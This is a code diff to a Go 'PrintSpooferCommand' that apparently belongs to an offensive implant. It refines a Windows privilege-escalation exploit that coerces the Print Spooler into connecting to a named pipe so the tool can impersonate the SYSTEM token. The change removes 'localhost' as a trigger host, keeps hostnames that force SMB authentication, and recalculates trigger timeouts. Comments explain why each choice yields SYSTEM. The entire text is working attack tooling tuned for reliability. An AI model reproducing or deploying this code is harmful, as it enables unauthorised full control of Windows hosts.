@@ -166,21 +166,19 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED
 
 	// Declare outside the if block so they're available for success output.
-	// Hostname priority for triggering the Spooler:
-	// 1. Computer name (NetBIOS) — triggers SMB auth, yields SYSTEM
-	// 2. DNS FQDN — triggers SMB auth via DNS, yields SYSTEM
-	// 3. 127.0.0.1 — forces SMB loopback auth (not local pipe), yields SYSTEM
-	// 4. localhost — last resort, uses local pipe namespace, yields NETWORK SERVICE
-	// The 127.0.0.1 trick is key: unlike "localhost" which maps to the local
-	// pipe namespace, the IP address forces Windows to use SMB over TCP,
-	// causing the Spooler to authenticate as SYSTEM.
+	// All hostnames must trigger SMB authentication to get SYSTEM.
+	// "localhost" is NOT included — it uses the local pipe namespace which
+	// yields NETWORK SERVICE (our own process token) instead of SYSTEM.
+	// Hostname priority:
+	// 1. Computer name (NetBIOS) — triggers SMB auth via loopback
+	// 2. DNS FQDN — triggers SMB auth via DNS resolution
+	// 3. 127.0.0.1 — forces SMB over TCP loopback
 	var triggerWarnings []string
 	hostnames := []string{computerName}
 	if dnsHostname != "" && dnsHostname != computerName {
 		hostnames = append(hostnames, dnsHostname)
 	}
 	hostnames = append(hostnames, "127.0.0.1")
-	hostnames = append(hostnames, "localhost")
 
 	if !alreadyConnected {
 		// Trigger the Print Spooler to connect to our pipe.
@@ -199,14 +197,16 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		// impersonate as SYSTEM. Computer name and FQDN trigger SMB auth;
 		// localhost may connect via local path and yield NETWORK SERVICE.
 
-		// Per-trigger timeout: 10 seconds for named hostnames, 5 for localhost.
-		// OpenPrinterW on domain-joined machines can block during name resolution.
+		// Per-trigger timeout: use half of the overall timeout (divided among triggers)
+		// but at least 10s. OpenPrinterW on domain-joined machines can block during
+		// name resolution, especially for NetBIOS names going through WINS/broadcast.
+		perTriggerTimeout := time.Duration(args.Timeout/len(hostnames)) * time.Second
+		if perTriggerTimeout < 10*time.Second {
+			perTriggerTimeout = 10 * time.Second
+		}
 		for _, host := range hostnames {
 			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
-			triggerTimeout := 10 * time.Second
-			if host == "localhost" {
-				triggerTimeout = 5 * time.Second
-			}
+			triggerTimeout := perTriggerTimeout
 
 			// Run trigger in goroutine — OpenPrinterW can block the OS thread
 			triggerDone := make(chan error, 1)
